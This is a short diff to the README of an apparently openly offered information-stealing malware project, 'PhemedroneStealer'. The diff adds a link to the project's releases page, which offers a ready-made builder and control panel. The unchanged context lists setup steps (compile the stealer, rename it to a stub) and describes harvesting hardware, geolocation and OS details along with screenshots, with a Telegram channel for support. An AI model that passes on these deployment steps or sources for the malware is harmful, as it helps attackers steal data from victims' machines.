@@ -24,7 +24,7 @@ Join our Telegram channel to get help or stay tuned about our recent projects
     Detailed System information which includes hardware, geolocation and OS information with a Screenshot
 
 # How to Setup? 📁​
-If it is difficult for you, download a ready-made builder and panel from the releases 
+If it is difficult for you, download a ready-made builder and panel from the [releases](https://github.com/nullixx/PhemedroneStealer/releases/tag/release) 
 
 - download source code
 - compile stealer itself and change it to "stub" without extension
